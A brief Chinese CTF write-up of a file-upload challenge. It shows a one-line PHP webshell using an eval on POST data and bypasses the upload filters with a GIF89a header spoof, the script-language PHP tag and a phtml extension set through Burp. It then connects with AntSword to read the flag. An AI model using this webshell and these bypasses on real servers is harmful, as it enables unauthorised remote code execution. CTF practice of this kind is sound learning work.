上传jpg格式的一句话木马
提示不是真正的图片，加上`GIF89a`绕过图片头检测
提示有`<?`，用旧式标签`<script language='php'>@eval($_POST[shell]);</script>`
可以成功上传了，用BP改后缀名
试到phtml才可以成功上传
然后猜测上传目录是upload，访问成功
用蚁剑连接上传的文件，`.../upload/filename`
在根目录中一路往上找到flag